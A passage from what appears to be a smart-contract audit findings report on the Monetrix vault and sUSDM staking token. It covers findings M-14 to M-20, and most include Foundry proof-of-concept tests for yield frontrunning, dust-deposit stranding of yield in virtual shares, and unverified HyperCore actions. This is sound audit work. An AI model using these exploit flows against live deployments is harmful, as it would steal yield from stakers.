        uint256 requestId = susdm.cooldownShares(attackerShares);
        assertEq(requestId, 0);

        assertGt(usdm.balanceOf(address(susdm)), 400_000e6, "large yield remainder is stranded in sUSDM");

        vm.warp(block.timestamp + 60);
        vm.prank(attacker);
        susdm.claimUnstake(requestId);

        assertGt(usdm.balanceOf(attacker), 400_000e6, "attacker profits massively from dust stake");
    }
}


## Suggested Mitigation
Do not combine decimals() == 6 with _decimalsOffset() == 6. For a 6-decimal asset/share pair, return 0 from _decimalsOffset(), or make share decimals reflect the offset consistently. Also require a meaningful minimum real totalSupply or minimum first deposit before injectYield, and consider routing yield to a reserve while totalSupply is below a configured threshold.
```

### M-14 / `VGXewSiUj8BHLOJxaVuhf`
- Finding title: Hedge execution emits success without verifying both spot and perp legs filled
- Report lines: 1424-1462
```md
## [M-14]. Hedge execution emits success without verifying both spot and perp legs filled

## id: VGXewSiUj8BHLOJxaVuhf

## Derived From Pattern/Invariant
AccountingInvariantViolation: hedge batch must atomically move matched spot and perp legs

## Exploit Type
AccountingInvariantViolation

## Location
MonetrixVault.executeHedge / closeHedge

## Finding Status: Valid
### Finding Status Justification: The hedge functions submit separate spot and perp actions and emit HedgeExecuted or HedgeClosed immediately. There is no synchronous post-state read, fill-size tolerance check, or failed-batch state. The pair whitelist only validates configured assets, not execution success. If one HyperCore action fills and the other is rejected, dropped, or rests, the vault can be directionally exposed while observers see a success event. Repair exists as a separate manual action, but it is not an automatic safeguard against the initial mismatch.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
The hedge functions dispatch two independent HyperCore actions and immediately emit success without confirming post-trade state. Vulnerable snippets: `ActionEncoder.sendBuySpot(params); ActionEncoder.sendShortPerp(params); emit HedgeExecuted(...)` and `ActionEncoder.sendSellSpot(params); ActionEncoder.sendClosePerp(params); emit HedgeClosed(...)`. A successful EVM call to the CoreWriter only proves that actions were submitted; it does not prove both L1 orders were accepted, filled, or filled for the same size. If one leg is silently dropped, partially filled, or filled at a materially different rate, the vault can hold an unpaired spot or perp exposure while the contract records no failed-batch state and emits a successful event.

## Impact
Protocol backing can become directionally exposed despite the delta-neutral invariant. Market movement against the unpaired leg can cause real losses to USDM backing and can also make subsequent settlement/accounting decisions operate on a portfolio state that the vault never marked as needing repair.

## Command to Run Test


## Proof of Concept
1. Operator submits syntactically valid hedge params for a whitelisted pair. 2. The spot order is accepted or filled, while the perp order is rejected, dropped, or remains unfilled on HyperCore. 3. `executeHedge()` still emits `HedgeExecuted` and stores no pending repair marker. 4. The vault now has net long spot exposure without the intended short perp. 5. A price move against the exposed side reduces protocol backing before a manual repair occurs.

## Proof of Code
function testExecuteHedgeCanEmitSuccessWithOnlyOneLegFilled() public { ActionEncoder.HedgeParams memory p = ActionEncoder.HedgeParams({spotAsset: 10001, perpAsset: 1, size: 1e8, spotPrice: 100000e8, perpPrice: 100000e8, cloid: 1, tif: 1, spotReduceOnly: false, perpReduceOnly: false}); whitelistPair(1, 10001); vm.prank(operator); vault.executeHedge(1, p); assertEq(coreWriter.actionsLength(), 2); mockSpotFilled(address(vault), 1e8, 100000e8); mockPerpPosition(address(vault), int64(0)); uint256 spotNotional = accountant.previewSpotNotional(address(vault), 1); int256 perpExposure = accountant.previewPerpExposure(address(vault)); assertGt(spotNotional, 0); assertEq(perpExposure, 0); }

## Suggested Mitigation
Do not treat submission as execution. Track hedge batches by cloid/position id, read L1 post-state after execution, and require spot/perp delta to be within configured residual tolerance before marking the batch successful or allowing settlement to proceed. Alternatively split execution into submit and confirm phases and force `repairHedge()` before any accounting path can recognize the position as balanced.
```

### M-15 / `mXm88s3ZwJpaIYOi_uq0x`
- Finding title: Supplying to BLP registers accountant slots even when the HyperCore supply action is silently dropped
- Report lines: 1463-1547
```md
## [M-15]. Supplying to BLP registers accountant slots even when the HyperCore supply action is silently dropped

## id: mXm88s3ZwJpaIYOi_uq0x

## Derived From Pattern/Invariant
UncheckedLowLevelCallResults

## Exploit Type
Dos

## Location
MonetrixVault.supplyToBlp

## Finding Status: Valid
### Finding Status Justification: removeSuppliedEntry is only a post-incident cleanup path. It does not prevent registering an unactivated slot or prevent totalBackingSigned/settlement views from reverting after a silently dropped CoreWriter action.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
`supplyToBlp()` assumes that `ActionEncoder.sendSupply()` successfully activates the HyperCore 0x811 supplied-balance slot, then immediately registers that slot in the accountant:

`ActionEncoder.sendSupply(token, l1Amount);`
`MonetrixAccountant(accountant).notifyVaultSupply(token, perpIndex);`

The protocol documentation and actor model acknowledge that CoreWriter actions can be accepted by the EVM call but silently dropped or fail on the L1 side. The accountant intentionally performs strict reads for every registered supplied slot; if a slot was registered but never activated, `PrecompileReader.suppliedBalance()` can revert and make `totalBackingSigned()`, `surplus()`, `distributableSurplus()`, `settle()`, and related yield/bridge views fail closed.

## Impact
A transient or silent HyperCore action failure can turn into an on-chain accounting DoS. Yield settlement and surplus reads can revert until an operator removes the bad supplied entry, delaying settlement and liquidity management during stress.

## Command to Run Test


## Proof of Concept
1. CoreWriter accepts the EVM `sendSupply` call but does not activate the 0x811 supplied slot on HyperCore.
2. `supplyToBlp()` still calls `notifyVaultSupply()`.
3. The accountant stores the supplied slot as known.
4. Later `totalBackingSigned()` iterates registered supplied slots and calls 0x811.
5. Because the slot was never activated, the strict precompile read reverts and settlement/accounting paths are unavailable until manual cleanup.

## Proof of Code
pragma solidity ^0.8.27;

import {Test} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {MonetrixVault} from "../src/core/MonetrixVault.sol";
import {IMonetrixAccessController} from "../src/governance/IMonetrixAccessController.sol";

contract ACLAllRoles is IMonetrixAccessController {
    bytes32 public constant override GUARDIAN = keccak256("MONETRIX_GUARDIAN");
    bytes32 public constant override GOVERNOR = keccak256("MONETRIX_GOVERNOR");
    bytes32 public constant override UPGRADER = keccak256("MONETRIX_UPGRADER");
    bytes32 public constant override OPERATOR = keccak256("MONETRIX_OPERATOR");
    function hasRole(bytes32, address) public pure override returns (bool) { return true; }
    function checkRole(bytes32, address) external pure override {}
}

contract CoreWriterAcceptsButDoesNothing { function sendRawAction(bytes calldata) external {} }
contract RecordingAccountant { bool public registered; function notifyVaultSupply(uint64, uint32) external { registered = true; } }

contract SupplyVaultHarness is MonetrixVault {
    function exposedSetAccountant(address a) external { accountant = a; }
}

contract SupplyRegistrationPoC is Test {
    function testVaultRegistersSupplyWithoutVerifyingHyperCoreActivation() external {
        ACLAllRoles acl = new ACLAllRoles();
        SupplyVaultHarness impl = new SupplyVaultHarness();
        ERC1967Proxy proxy = new ERC1967Proxy(address(impl), abi.encodeCall(MonetrixVault.initialize, (address(1), address(2), address(3), address(4), address(5), address(acl))));
        SupplyVaultHarness vault = SupplyVaultHarness(address(proxy));
        RecordingAccountant accountant = new RecordingAccountant();
        vault.exposedSetAccountant(address(accountant));
        vm.etch(address(0x3333333333333333333333333333333333333333), address(new CoreWriterAcceptsButDoesNothing()).code);

        vault.supplyToBlp(0, 100);
        assertTrue(accountant.registered(), "slot was registered even though the mocked CoreWriter produced no L1 supply effect");
    }
}


## Suggested Mitigation
Separate L1 action submission from accounting registration. Register supplied slots only after a confirmed 0x811 read proves the slot is active, or keep new slots pending until a reconciliation transaction verifies the L1 effect. Alternatively, make accountant supplied-slot reads tolerant of unactivated zero slots and require explicit activation proofs before including balances in backing.
```

### M-16 / `6XZ6R35K-AS-mqKcn6SrS`
- Finding title: Late stakers can frontrun sUSDM.injectYield to capture yield earned before they joined
- Report lines: 1548-1694
```md
## [M-16]. Late stakers can frontrun sUSDM.injectYield to capture yield earned before they joined

## id: 6XZ6R35K-AS-mqKcn6SrS

## Derived From Pattern/Invariant
RewardCheckpointFreeRiderOrLateJoiner

## Exploit Type
FrontrunMev

## Location
sUSDM.deposit / injectYield / cooldownShares

## Finding Status: Valid
### Finding Status Justification: The reported functions exist and the flow is feasible. deposit() mints ERC4626 shares against the pre-injection totalAssets, while injectYield later transfers USDM into the vault balance and benefits all current shares. No snapshot, stake-age requirement, reward debt, or deposit cutoff prevents a transaction ordered immediately before injectYield from sharing the yield. cooldownShares can then lock in the higher assets-per-share after injection. This is economically meaningful but limited to yield dilution, so Medium impact is appropriate. It requires visibility/timing and capital, so likelihood is occasional. The V12 late-staker issue has the same root and impact but different severity, so it is in scope under the stated duplicate rule.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
sUSDM distributes each yield injection to whoever holds shares at the instant injectYield() transfers USDM into the vault. There is no per-user reward index, minimum holding period, stake checkpoint, or snapshot taken before the vault's pending yield distribution. A searcher that observes an upcoming vault injectYield() transaction can deposit a large USDM amount immediately before it, receive sUSDM shares, absorb a pro-rata share of the injection, and then call cooldownShares() after the injection to lock in principal plus captured yield. The value is taken from existing long-term stakers because their pro-rata share of the same injection is diluted by the last-minute stake.

Vulnerable snippets:

function deposit(uint256 assets, address receiver) public override nonReentrant whenNotPaused returns (uint256) {
    return super.deposit(assets, receiver);
}

function injectYield(uint256 usdmAmount) external onlyVault nonReentrant {
    require(usdmAmount > 0, "sUSDM: zero yield");
    require(usdmAmount <= config.maxYieldPerInjection(), "sUSDM: yield exceeds max");
    require(totalSupply() > 0, "sUSDM: no stakers");
    IERC20(asset()).safeTransferFrom(msg.sender, address(this), usdmAmount);
    totalYieldInjected += usdmAmount;
    lastCumulativeYield = (totalAssets() * 1e18) / totalSupply();
    emit YieldInjected(usdmAmount, totalAssets(), totalSupply());
}

## Impact
Existing sUSDM holders lose a material portion of an imminent yield injection to a late entrant that did not provide capital during the yield accrual period. The attacker can lock in the captured USDM through cooldownShares(), making the loss economic rather than only cosmetic.

## Command to Run Test


## Proof of Concept
1. Alice is a long-term staker and deposits 1,000 USDM into sUSDM.
2. The vault prepares to inject 100 USDM of yield into sUSDM.
3. A mempool observer sees the pending injectYield(100 USDM) call and deposits 9,000 USDM immediately before it.
4. The vault's injectYield() executes and the 100 USDM is distributed across the now-expanded share supply.
5. The attacker calls cooldownShares() and locks a claim for more USDM than they deposited, while Alice receives only about 10% of the injection despite being the only pre-existing staker.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "../src/tokens/sUSDM.sol";
import "../src/tokens/sUSDMEscrow.sol";

contract MockUSDM is ERC20 {
    constructor() ERC20("USDM", "USDM") {}
    function decimals() public pure override returns (uint8) { return 6; }
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract MockConfig {
    uint256 public unstakeCooldown = 3 days;
    uint256 public maxYieldPerInjection = type(uint256).max;
}

contract MockACL {
    bytes32 public constant GUARDIAN = keccak256("MONETRIX_GUARDIAN");
    bytes32 public constant GOVERNOR = keccak256("MONETRIX_GOVERNOR");
    bytes32 public constant UPGRADER = keccak256("MONETRIX_UPGRADER");
    bytes32 public constant OPERATOR = keccak256("MONETRIX_OPERATOR");
    function hasRole(bytes32, address) external pure returns (bool) { return true; }
    function checkRole(bytes32, address) external pure {}
}

contract SUSDMYieldSnipePoC is Test {
    MockUSDM usdm;
    MockConfig config;
    MockACL acl;
    sUSDM susdm;
    sUSDMEscrow escrow;

    address alice = address(0xA11CE);
    address attacker = address(0xB0B);
    address vault = address(0xAA77);

    function setUp() public {
        usdm = new MockUSDM();
        config = new MockConfig();
        acl = new MockACL();

        sUSDM impl = new sUSDM();
        ERC1967Proxy proxy = new ERC1967Proxy(
            address(impl),
            abi.encodeCall(sUSDM.initialize, (address(usdm), address(config), address(acl)))
        );
        susdm = sUSDM(address(proxy));
        escrow = new sUSDMEscrow(address(usdm), address(susdm));
        susdm.setEscrow(address(escrow));
        susdm.setVault(vault);

        usdm.mint(alice, 1_000e6);
        usdm.mint(attacker, 9_000e6);
        usdm.mint(vault, 100e6);
    }

    function testLateStakerCapturesPendingYield() public {
        vm.startPrank(alice);
        usdm.approve(address(susdm), type(uint256).max);
        susdm.deposit(1_000e6, alice);
        vm.stopPrank();

        uint256 aliceShares = susdm.balanceOf(alice);
        assertEq(susdm.convertToAssets(aliceShares), 1_000e6);

        vm.startPrank(attacker);
        usdm.approve(address(susdm), type(uint256).max);
        susdm.deposit(9_000e6, attacker);
        vm.stopPrank();

        vm.startPrank(vault);
        usdm.approve(address(susdm), 100e6);
        susdm.injectYield(100e6);
        vm.stopPrank();

        vm.prank(attacker);
        uint256 requestId = susdm.cooldownShares(susdm.balanceOf(attacker));

        (, , uint256 attackerClaim,,) = susdm.unstakeRequests(requestId);
        uint256 aliceAssetsAfter = susdm.convertToAssets(susdm.balanceOf(alice));

        assertGt(attackerClaim, 9_000e6, "attacker locks profit from yield they did not earn");
        assertLt(aliceAssetsAfter, 1_100e6, "pre-existing staker is diluted below full yield claim");
    }
}

## Suggested Mitigation
Snapshot eligible supply before yield becomes publicly actionable, or route yield through a checkpointed reward index that only credits shares present before the accrual/distribution window. A simpler mitigation is to enforce a minimum stake age before shares participate in injectYield(), or make the vault distribute using a previously snapshotted totalSupply and holder balances.
```

### M-17 / `-bu-ZQL12LJrtjVvaoqvr`
- Finding title: Late sUSDM deposits can free-ride on already accrued yield injected through sUSDM.injectYield
- Report lines: 1695-1839
```md
## [M-17]. Late sUSDM deposits can free-ride on already accrued yield injected through sUSDM.injectYield

## id: -bu-ZQL12LJrtjVvaoqvr

## Derived From Pattern/Invariant
RewardCheckpointFreeRiderOrLateJoiner

## Exploit Type
AccountingInvariantViolation

## Location
sUSDM.deposit / injectYield

## Finding Status: Valid
### Finding Status Justification: The code distributes injected yield to whoever holds sUSDM shares at injectYield execution time. deposit() has no checkpoint, reward index, minimum holding period, or pending-yield inclusion in its share pricing. Thus a late depositor can enter at the stale pre-injection exchange rate, receive shares, and participate pro rata in the imminent injection. The loss is dilution of long-term stakers' yield rather than direct principal theft. Exploitability requires timing/capital and an observable or orderable injection, making likelihood occasional. The root cause is the same class as V12 late-staker sniping, but severity differs, so it is in scope by the contest rule.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
sUSDM distributes injected yield to whoever holds shares at the moment `injectYield` is called. There is no per-user reward index, reward debt, minimum holding period, or snapshot separating users who were staked while yield accrued from users who deposit immediately before distribution. The vulnerable flow is:

```solidity
function deposit(uint256 assets, address receiver) public override nonReentrant whenNotPaused returns (uint256) {
    return super.deposit(assets, receiver);
}

function injectYield(uint256 usdmAmount) external onlyVault nonReentrant {
    require(usdmAmount > 0, "sUSDM: zero yield");
    require(usdmAmount <= config.maxYieldPerInjection(), "sUSDM: yield exceeds max");
    require(totalSupply() > 0, "sUSDM: no stakers");

    IERC20(asset()).safeTransferFrom(msg.sender, address(this), usdmAmount);

    totalYieldInjected += usdmAmount;
    lastCumulativeYield = (totalAssets() * 1e18) / totalSupply();
}
```

Because `deposit` prices shares from current `totalAssets()` before the pending yield enters sUSDM, a late depositor can join at the stale pre-yield exchange rate, then receive a pro-rata share of yield generated before they participated. The loss is borne by long-term sUSDM holders whose accrued yield is diluted by the late depositor.

## Impact
Long-term stakers lose a pro-rata share of settled but not-yet-injected yield to late joiners. A permissionless attacker can monitor the mempool for the vault's yield distribution and deposit immediately before it, extracting in-motion yield without bearing the historical staking exposure.

## Command to Run Test


## Proof of Concept
1. Alice stakes 1,000 USDM into sUSDM and is the only long-term yield participant.
2. The protocol accrues 1,000 USDM of distributable yield outside sUSDM.
3. Bob observes the upcoming yield injection/distribution transaction and deposits 1,000 USDM immediately before it.
4. The vault calls `injectYield(1,000e6)`, increasing `totalAssets()` while Alice and Bob have equal shares.
5. Bob cools down and claims his shares, receiving roughly 1,500 USDM: his principal plus about half of the yield Alice economically earned before Bob joined.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "src/tokens/sUSDM.sol";
import "src/tokens/sUSDMEscrow.sol";

contract MockUSDM is ERC20 {
    constructor() ERC20("USDM", "USDM") {}
    function decimals() public pure override returns (uint8) { return 6; }
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract MockConfig {
    uint256 public unstakeCooldown = 3 days;
    uint256 public maxYieldPerInjection = type(uint256).max;
}

contract MockACL is IMonetrixAccessController {
    bytes32 public constant override GUARDIAN = keccak256("MONETRIX_GUARDIAN");
    bytes32 public constant override GOVERNOR = keccak256("MONETRIX_GOVERNOR");
    bytes32 public constant override UPGRADER = keccak256("MONETRIX_UPGRADER");
    bytes32 public constant override OPERATOR = keccak256("MONETRIX_OPERATOR");
    function hasRole(bytes32, address) public pure override returns (bool) { return true; }
    function checkRole(bytes32, address) external pure override {}
}

contract LateJoinerFreeRiderPoC is Test {
    MockUSDM usdm;
    MockConfig config;
    MockACL acl;
    sUSDM susdm;
    sUSDMEscrow escrow;

    address alice = address(0xA11CE);
    address bob = address(0xB0B);

    function setUp() public {
        usdm = new MockUSDM();
        config = new MockConfig();
        acl = new MockACL();

        sUSDM impl = new sUSDM();
        ERC1967Proxy proxy = new ERC1967Proxy(
            address(impl),
            abi.encodeCall(sUSDM.initialize, (address(usdm), address(config), address(acl)))
        );
        susdm = sUSDM(address(proxy));

        escrow = new sUSDMEscrow(address(usdm), address(susdm));
        susdm.setEscrow(address(escrow));
        susdm.setVault(address(this));

        usdm.mint(alice, 1_000e6);
        usdm.mint(bob, 1_000e6);
        usdm.mint(address(this), 1_000e6);
    }

    function testLateJoinerCapturesHistoricalYield() public {
        vm.startPrank(alice);
        usdm.approve(address(susdm), 1_000e6);
        susdm.deposit(1_000e6, alice);
        vm.stopPrank();

        vm.startPrank(bob);
        usdm.approve(address(susdm), 1_000e6);
        susdm.deposit(1_000e6, bob);
        vm.stopPrank();

        usdm.approve(address(susdm), 1_000e6);
        susdm.injectYield(1_000e6);

        vm.startPrank(bob);
        uint256 requestId = susdm.cooldownShares(susdm.balanceOf(bob));
        vm.warp(block.timestamp + config.unstakeCooldown());
        susdm.claimUnstake(requestId);
        vm.stopPrank();

        assertGt(usdm.balanceOf(bob), 1_400e6, "late depositor captured historical yield");
    }
}


## Suggested Mitigation
Snapshot yield entitlement before accepting new deposits for a distribution epoch. A typical fix is to account pending yield through a per-share index with `userRewardPerTokenPaid` / `rewardDebt`, or to force `distributeYield`/`injectYield` before any deposit or mint when pending yield exists. Alternatively, mint shares against `totalAssets() + pendingDistributableYield` so late deposits pay the post-yield exchange rate.
```

### M-18 / `nJ-m0Tzzb9sfJAB2xVy3J`
- Finding title: Low initial sUSDM supply lets injected yield be trapped in ERC4626 virtual shares
- Report lines: 1840-1889
```md
## [M-18]. Low initial sUSDM supply lets injected yield be trapped in ERC4626 virtual shares

## id: nJ-m0Tzzb9sfJAB2xVy3J

## Derived From Pattern/Invariant
ERC4626SharePriceMismatch / PrecisionDriftAccumulation

## Exploit Type
ERC4626SharePrice

## Location
sUSDM.injectYield / cooldownShares

## Finding Status: Valid
### Finding Status Justification: injectYield only checks totalSupply() > 0 and does not require real supply to be large relative to OZ's 1e6 virtual shares. With _decimalsOffset() = 6, a 1-base-unit first deposit creates 1e6 real shares, so real and virtual shares split subsequent assets approximately evenly. cooldownShares burns real shares and deposits only convertToAssets(shares) into escrow, leaving the virtual-share portion in sUSDM after totalSupply becomes zero. The loss can be material up to the configured injection cap. Preconditions are realistic mainly during launch or low-supply periods, so likelihood is occasional. The known V12 item has same general root but Low severity, so this Medium finding is in scope by the rule.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
sUSDM reports 6 decimals but also sets _decimalsOffset() to 6, so OpenZeppelin ERC4626 adds 1e6 virtual shares to every conversion. When real supply is small, those virtual shares receive a material part of later injected yield but cannot be burned by any real holder. Vulnerable snippet: function _decimalsOffset() internal pure override returns (uint8) { return 6; } and injectYield() only requires totalSupply() > 0 before transferring yield into totalAssets(). With a 1-base-unit initial stake, real shares equal the 1e6 virtual-share constant; after a normal yield injection, only about half of totalAssets() is claimable by the real holder and the rest remains stranded after all shares are cooled down.

## Impact
Real USDM yield distributed to sUSDM can become permanently unclaimable. With the configured maxYieldPerInjection of 1,000,000 USDM, a low-supply injection can strand a large amount of matured yield in the sUSDM contract while totalSupply becomes zero.

## Command to Run Test


## Proof of Concept
1. Attacker deposits 1 smallest USDM unit into an empty sUSDM vault, satisfying injectYield's totalSupply > 0 check. 2. The trusted vault later performs a normal injectYield. 3. Because real shares are comparable to the 1e6 virtual shares, convertToAssets(real totalSupply) returns only about half of totalAssets. 4. Attacker calls cooldownShares for all real shares. 5. totalSupply becomes zero while a material USDM balance remains in sUSDM with no real shares able to claim it.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;
import "forge-std/Test.sol";
import "src/tokens/sUSDM.sol";
import "src/tokens/sUSDMEscrow.sol";
import "src/governance/IMonetrixAccessController.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
contract MockUSDM is ERC20 { constructor() ERC20("USDM", "USDM") {} function decimals() public pure override returns (uint8) { return 6; } function mint(address to, uint256 amount) external { _mint(to, amount); } }
contract MockConfig { function unstakeCooldown() external pure returns (uint256) { return 3 days; } function maxYieldPerInjection() external pure returns (uint256) { return type(uint256).max; } }
contract MockACL is IMonetrixAccessController { function GUARDIAN() external pure returns (bytes32) { return keccak256("G"); } function GOVERNOR() external pure returns (bytes32) { return keccak256("V"); } function UPGRADER() external pure returns (bytes32) { return keccak256("U"); } function OPERATOR() external pure returns (bytes32) { return keccak256("O"); } function hasRole(bytes32, address) external pure returns (bool) { return true; } function checkRole(bytes32, address) external pure {} }
contract SUSDMVirtualShareLossTest is Test { MockUSDM usdm; sUSDM token; function setUp() public { usdm = new MockUSDM(); MockConfig config = new MockConfig(); MockACL acl = new MockACL(); sUSDM impl = new sUSDM(); ERC1967Proxy proxy = new ERC1967Proxy(address(impl), abi.encodeCall(sUSDM.initialize, (address(usdm), address(config), address(acl)))); token = sUSDM(address(proxy)); sUSDMEscrow escrow = new sUSDMEscrow(address(usdm), address(token)); token.setEscrow(address(escrow)); token.setVault(address(this)); usdm.mint(address(this), 2_000_000e6); usdm.approve(address(token), type(uint256).max); } function testDustSupplyTrapsInjectedYieldInVirtualShares() public { token.deposit(1, address(this)); token.injectYield(1_000_000e6); uint256 allShares = token.balanceOf(address(this)); uint256 claimable = token.convertToAssets(allShares); assertLt(claimable, token.totalAssets()); token.cooldownShares(allShares); assertEq(token.totalSupply(), 0); assertGt(token.totalAssets(), 400_000e6); } }

## Suggested Mitigation
Do not combine 6 reported share decimals with a 6 decimal offset. For a 6-decimal USDM vault whose share token also reports 6 decimals, set _decimalsOffset() to 0, or otherwise use explicit internal accounting that excludes virtual shares from economically receiving injected yield. Also enforce a meaningful minimum initial real supply before allowing injectYield.
```

### M-19 / `wEkO1pypNFhqLehk7ie0D`
- Finding title: L1 bridge-back accounting can be reduced using held or supplied balances that cannot satisfy SEND_ASSET
- Report lines: 1890-1984
```md
## [M-19]. L1 bridge-back accounting can be reduced using held or supplied balances that cannot satisfy SEND_ASSET

## id: wEkO1pypNFhqLehk7ie0D

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
MonetrixVault.bridgePrincipalFromL1 / _sendL1Bridge

## Finding Status: Valid
### Finding Status Justification: bridgePrincipalFromL1 decrements outstandingL1Principal before sending the CoreWriter bridge action. _sendL1Bridge checks spotBalance.total and, when pmEnabled, also suppliedBalance. It ignores spotBalance.hold and treats supplied 0x811 balances as immediately bridgeable, although SEND_ASSET requires spendable spot USDC. If the EVM CoreWriter call succeeds but L1 drops the action for insufficient free spot, accounting is reduced without funds arriving. The local require is an incomplete safeguard, not a valid bridge receipt.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
`bridgePrincipalFromL1()` decrements `outstandingL1Principal` before `_sendL1Bridge()` sends the HyperCore action. `_sendL1Bridge()` treats the full L1 spot `total` and, when PM is enabled, supplied USDC as bridgeable liquidity:

`uint256 l1Available = uint256(PrecompileReader.spotBalance(address(this), usdcToken).total);`
`if (pmEnabled) { l1Available += uint256(PrecompileReader.suppliedBalance(address(this), usdcToken)); }`
`require(l1Available >= TokenMath.usdcEvmToL1Wei(amount), ...);`
`ActionEncoder.sendBridgeToL1(amount);`

`SpotBalance` includes a `hold` field, but the vault ignores it. Balances locked in open orders, and balances supplied into PM/BLP, are not the same as free spot balance available for a `SEND_ASSET` bridge action. If the CoreWriter accepts the EVM call while HyperCore silently drops the L1 action because the free spot balance is insufficient, the vault has already reduced `outstandingL1Principal` and emitted a bridge-back event even though no principal returned to EVM liquidity.

## Impact
Redemption liquidity accounting can become permanently understated. Matured redeemers remain unfunded, while `outstandingL1Principal` no longer reflects the principal still stranded on L1. The normal and emergency principal bridge paths are capped by the reduced counter, so recovery may require governance raw actions instead of the intended code-bounded bridge-back flow.

## Command to Run Test


## Proof of Concept
1. Vault has 1 USDC of `outstandingL1Principal` and a redemption shortfall of 1 USDC.
2. Its HyperCore L1 account reports `spotBalance.total = 1e8` but `spotBalance.hold = 1e8`, so free spot USDC is zero.
3. Operator calls `bridgePrincipalFromL1(1e6)`.
4. `_sendL1Bridge()` accepts the amount because it checks `total`, not `total - hold`.
5. The CoreWriter call succeeds at the EVM layer, but the L1 `SEND_ASSET` cannot execute from free spot balance and is silently dropped.
6. `outstandingL1Principal` is reduced by 1 USDC while the EVM side receives no USDC.

## Proof of Code
pragma solidity ^0.8.27;

import {Test} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {MonetrixVault} from "../src/core/MonetrixVault.sol";
import {IMonetrixAccessController} from "../src/governance/IMonetrixAccessController.sol";

contract MockACL is IMonetrixAccessController {
    bytes32 public constant override GUARDIAN = keccak256("MONETRIX_GUARDIAN");
    bytes32 public constant override GOVERNOR = keccak256("MONETRIX_GOVERNOR");
    bytes32 public constant override UPGRADER = keccak256("MONETRIX_UPGRADER");
    bytes32 public constant override OPERATOR = keccak256("MONETRIX_OPERATOR");
    function hasRole(bytes32, address) public pure override returns (bool) { return true; }
    function checkRole(bytes32, address) external pure override {}
}

contract RedeemEscrowShortfallMock { function shortfall() external pure returns (uint256) { return 1_000_000; } }
contract CoreWriterNoop { function sendRawAction(bytes calldata) external {} }
contract SpotHeldPrecompile { fallback(bytes calldata) external returns (bytes memory) { return abi.encode(uint64(100_000_000), uint64(100_000_000), uint64(0)); } }

contract VaultHarness is MonetrixVault {
    function exposedWire(address re, uint256 principal) external {
        redeemEscrow = re;
        accountant = address(0xA11CE);
        yieldEscrow = address(0xBEEF);
        outstandingL1Principal = principal;
    }
}

contract L1BridgeHeldBalancePoC is Test {
    function testBridgePrincipalReducesAccountingEvenWhenOnlyHeldSpotExists() external {
        MockACL acl = new MockACL();
        VaultHarness impl = new VaultHarness();
        ERC1967Proxy proxy = new ERC1967Proxy(address(impl), abi.encodeCall(MonetrixVault.initialize, (address(1), address(2), address(3), address(4), address(5), address(acl))));
        VaultHarness vault = VaultHarness(address(proxy));
        vault.exposedWire(address(new RedeemEscrowShortfallMock()), 1_000_000);

        vm.etch(address(0x0000000000000000000000000000000000000801), address(new SpotHeldPrecompile()).code);
        vm.etch(address(0x3333333333333333333333333333333333333333), address(new CoreWriterNoop()).code);

        vault.bridgePrincipalFromL1(1_000_000);
        assertEq(vault.outstandingL1Principal(), 0, "principal accounting was reduced despite zero free L1 spot");
    }
}


## Suggested Mitigation
Check only freely transferable L1 spot balance. Use `total - hold`, do not count supplied/PM balances unless they are first withdrawn back to spot, and add an effect-confirmation or reconciliation step before decrementing `outstandingL1Principal`. If HyperCore actions can be silently dropped, track bridge requests as pending and finalize accounting only after a confirmed balance change.
```

### M-20 / `auD8e5eF4-wAW6yYUUeGZ`
- Finding title: Dust mint can lock nearly all injected yield in sUSDM virtual shares
- Report lines: 1985-2110
```md
## [M-20]. Dust mint can lock nearly all injected yield in sUSDM virtual shares

## id: auD8e5eF4-wAW6yYUUeGZ

## Derived From Pattern/Invariant
ERC4626SharePriceMismatch

## Exploit Type
ERC4626SharePrice

## Location
sUSDM.mint / injectYield / cooldownShares

## Finding Status: Valid
### Finding Status Justification: The mint variant is feasible. In an empty vault, previewMint(1) rounds up to 1 asset base unit while minting only 1 raw share. Because conversions include 1e6 virtual shares, a later large injectYield into totalSupply() == 1 leaves almost all injected assets economically assigned to virtual shares. cooldownShares(1) burns the only real share and moves only a tiny fraction of totalAssets into escrow, while the rest remains in sUSDM with totalSupply() == 0. No min mint, min supply, or recovery path prevents this. It requires a low/empty supply and subsequent legitimate yield injection, making likelihood occasional, but impact is high due to possible permanent non-dust asset stranding.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
